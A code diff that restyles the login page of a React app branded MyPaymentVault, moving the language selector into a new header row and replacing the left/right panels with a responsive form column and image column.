@@ -117,77 +117,42 @@ export default function Login() {
 
   return (
     <div
-      className="min-h-screen flex flex-col items-center justify-center login-outer"
-      style={{ background: "#f7f7f7" }}
+      className="login-outer"
+      style={{ minHeight: "100vh", background: "#f7f7f7", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center" }}
     >
       <style>{`
         /* ── MOBILE ── */
-        @media (max-width: 520px) {
+        @media (max-width: 768px) {
           .login-outer {
             background: #fff !important;
             justify-content: flex-start !important;
-            padding: 0 !important;
           }
           .login-card {
             max-width: 100% !important;
-            min-height: 100dvh !important;
+            width: 100% !important;
             box-shadow: none !important;
-            border-radius: 0 !important;
+            background: #fff !important;
+            min-height: 100dvh;
           }
-          .login-footer {
-            display: none !important;
+          .login-card-header {
+            padding: 16px 20px !important;
           }
+          .login-card-header .lang-btn { display: none !important; }
+          .login-form-col {
+            width: 100% !important;
+            padding: 20px 20px 32px !important;
+          }
+          .login-image-col { display: none !important; }
+          .login-hero-mobile { display: block !important; }
+          .login-footer { display: none !important; }
         }
         /* ── DESKTOP ── */
         @media (min-width: 769px) {
           .login-card {
-            flex-direction: row !important;
-            max-width: 860px !important;
-            width: 860px !important;
-            min-height: unset !important;
-            overflow: visible;
+            background: linear-gradient(to right, #ffffff 0%, #ffffff 58%, #212121 58%, #212121 100%) !important;
           }
-          .login-right {
-            width: 400px !important;
-            flex: 0 0 400px !important;
-            order: 1;
-            display: flex;
-            flex-direction: column;
-            position: relative;
-            z-index: 2;
-          }
-          .login-hero-mobile {
-            display: none !important;
-          }
-          .login-left {
-            width: 460px !important;
-            flex: 0 0 460px !important;
-            order: 2;
-            position: relative;
-            overflow: visible;
-            background: #111;
-            display: flex !important;
-            align-items: center;
-            justify-content: center;
-            z-index: 1;
-          }
-          .login-left img {
-            position: relative;
-            z-index: 3;
-            width: 85%;
-            height: auto;
-            object-fit: contain;
-            opacity: 0.97;
-            display: block;
-            margin-left: -90px;
-            border: 2px solid rgba(255,255,255,0.15);
-            box-shadow: 0 8px 40px rgba(0,0,0,0.5);
-          }
-        }
-        /* DESKTOP: sembunyikan login-left di mobile */
-        @media (max-width: 768px) {
-          .login-left { display: none !important; }
-          .login-right { width: 100%; }
+          .login-hero-mobile { display: none !important; }
+          .login-image-col { display: flex !important; }
         }
       `}</style>
       {/* ── MODAL 1: VERIFICATION REQUIRED ── */}
@@ -407,29 +372,76 @@ export default function Login() {
 
       {/* ─── CARD ─── */}
       <div
-        className="w-full flex flex-col bg-white login-card"
-        style={{ boxShadow: "0 2px 32px rgba(0,0,0,0.13)" }}
+        className="login-card"
+        style={{
+          width: "100%",
+          maxWidth: 960,
+          boxShadow: "0 2px 32px rgba(0,0,0,0.13)",
+          display: "flex",
+          flexDirection: "column",
+        }}
       >
+        {/* ══ HEADER: logo kiri + bahasa kanan ══ */}
+        <div
+          className="login-card-header"
+          style={{
+            display: "flex",
+            justifyContent: "space-between",
+            alignItems: "center",
+            padding: "16px 28px",
+          }}
+        >
+          {/* Logo */}
+          <span className="select-none" style={{ fontSize: 14, letterSpacing: "0.18em", color: "#111" }}>
+            <span style={{ fontWeight: 300 }}>MY</span>
+            <span style={{ fontWeight: 700 }}>PAYMENT</span>
+            <span style={{ fontWeight: 300 }}>VAULT</span>
+          </span>
 
-        {/* ══ RIGHT PANEL — form (order:1, kiri di desktop) ══ */}
-        <div className="login-right">
-
-          {/* HEADER ROW: Logo saja */}
-          <div style={{ padding: "18px 24px" }}>
-            <span className="select-none" style={{ fontSize: 15, letterSpacing: "0.18em", color: "#111" }}>
-              <span style={{ fontWeight: 300 }}>MY</span>
-              <span style={{ fontWeight: 700 }}>PAYMENT</span>
-              <span style={{ fontWeight: 300 }}>VAULT</span>
-            </span>
+          {/* Language selector */}
+          <div style={{ position: "relative" }} className="lang-btn">
+            <button
+              type="button"
+              onClick={() => setShowLangDropdown(!showLangDropdown)}
+              style={{ display: "flex", alignItems: "center", gap: 5, color: "#111", fontSize: 13, background: "#fff", border: "1px solid #ccc", borderRadius: 4, padding: "5px 10px", cursor: "pointer" }}
+            >
+              <Globe size={15} color="#555" />
+              <span>{languageOptions.find(o => o.code === lang)?.label ?? "English"}</span>
+              <ChevronDown size={13} color="#555" />
+            </button>
+            {showLangDropdown && (
+              <>
+                <div className="fixed inset-0 z-10" onClick={() => setShowLangDropdown(false)} />
+                <div style={{ position: "absolute", right: 0, top: "100%", marginTop: 4, width: 140, background: "#fff", border: "1px solid #ddd", boxShadow: "0 4px 16px rgba(0,0,0,0.25)", zIndex: 20 }}>
+                  {languageOptions.map((opt) => (
+                    <button
+                      key={opt.code}
+                      type="button"
+                      onClick={() => { setLang(opt.code); setShowLangDropdown(false); }}
+                      style={{ display: "block", width: "100%", textAlign: "left", padding: "10px 16px", fontSize: 13, background: "none", border: "none", cursor: "pointer", fontWeight: lang === opt.code ? 600 : 400, color: lang === opt.code ? "#111" : "#555" }}
+                    >
+                      {opt.label}
+                    </button>
+                  ))}
+                </div>
+              </>
+            )}
           </div>
+        </div>
 
-          {/* HERO IMAGE — mobile only (disembunyikan di desktop) */}
-          <div className="login-hero-mobile" style={{ width: "100%", lineHeight: 0 }}>
-            <img src="/hero-vault-new.png" alt="MyPaymentVault" style={{ width: "100%", display: "block" }} />
-          </div>
+        {/* ══ CONTENT ROW: form kiri + gambar kanan ══ */}
+        <div style={{ display: "flex", flex: 1 }}>
 
-          {/* FORM */}
-          <div style={{ padding: "28px 28px 24px" }}>
+          {/* FORM COLUMN */}
+          <div
+            className="login-form-col"
+            style={{ width: "58%", padding: "8px 40px 40px", background: "transparent" }}
+          >
+            {/* HERO IMAGE — mobile only */}
+            <div className="login-hero-mobile" style={{ display: "none", width: "100%", lineHeight: 0, margin: "0 -20px 16px", width: "calc(100% + 40px)" }}>
+              <img src="/hero-vault-new.png" alt="MyPaymentVault" style={{ width: "100%", display: "block" }} />
+            </div>
+
             <h2 style={{ fontSize: 17, fontWeight: 400, color: "#111", marginBottom: 6 }}>
               {t.accessAccount}
             </h2>
@@ -498,48 +510,23 @@ export default function Login() {
             </p>
           </div>
 
-        </div>{/* end login-right */}
-
-        {/* ══ LEFT PANEL — hero image (order:2, kanan di desktop) ══ */}
-        <div className="login-left">
-          <img src="/hero-vault-new.png" alt="MyPaymentVault" />
-
-          {/* Tombol bahasa — pojok kanan atas panel gambar */}
-          <div style={{ position: "absolute", top: 14, right: 14, zIndex: 10 }}>
-            <button
-              type="button"
-              onClick={() => setShowLangDropdown(!showLangDropdown)}
-              style={{ display: "flex", alignItems: "center", gap: 5, color: "#111", fontSize: 13, background: "#fff", border: "1px solid #ccc", borderRadius: 4, padding: "5px 10px", cursor: "pointer" }}
-            >
-              <Globe size={15} color="#555" />
-              <span>{languageOptions.find(o => o.code === lang)?.label ?? "English"}</span>
-              <ChevronDown size={13} color="#555" />
-            </button>
-            {showLangDropdown && (
-              <>
-                <div className="fixed inset-0 z-10" onClick={() => setShowLangDropdown(false)} />
-                <div style={{ position: "absolute", right: 0, top: "100%", marginTop: 4, width: 140, background: "#fff", border: "1px solid #ddd", boxShadow: "0 4px 16px rgba(0,0,0,0.25)", zIndex: 20 }}>
-                  {languageOptions.map((opt) => (
-                    <button
-                      key={opt.code}
-                      type="button"
-                      onClick={() => { setLang(opt.code); setShowLangDropdown(false); }}
-                      style={{ display: "block", width: "100%", textAlign: "left", padding: "10px 16px", fontSize: 13, background: "none", border: "none", cursor: "pointer", fontWeight: lang === opt.code ? 600 : 400, color: lang === opt.code ? "#111" : "#555" }}
-                    >
-                      {opt.label}
-                    </button>
-                  ))}
-                </div>
-              </>
-            )}
+          {/* IMAGE COLUMN */}
+          <div
+            className="login-image-col"
+            style={{ width: "42%", display: "none", alignItems: "stretch" }}
+          >
+            <img
+              src="/hero-vault-new.png"
+              alt="MyPaymentVault"
+              style={{ width: "100%", height: "100%", display: "block", objectFit: "cover" }}
+            />
           </div>
 
-        </div>
-
+        </div>{/* end content row */}
       </div>
 
       {/* ─── FOOTER ─── */}
-      <div className="login-footer" style={{ width: "100%", maxWidth: 900, marginTop: 12, textAlign: "center" }}>
+      <div className="login-footer" style={{ width: "100%", maxWidth: 960, marginTop: 12, textAlign: "center" }}>
         <span style={{ fontSize: 11, color: "#888" }}>
           &copy; {t.copyright} |{" "}
           <button onClick={() => {}} style={{ fontSize: 11, color: "#888", textDecoration: "underline", background: "none", border: "none", cursor: "pointer" }}>
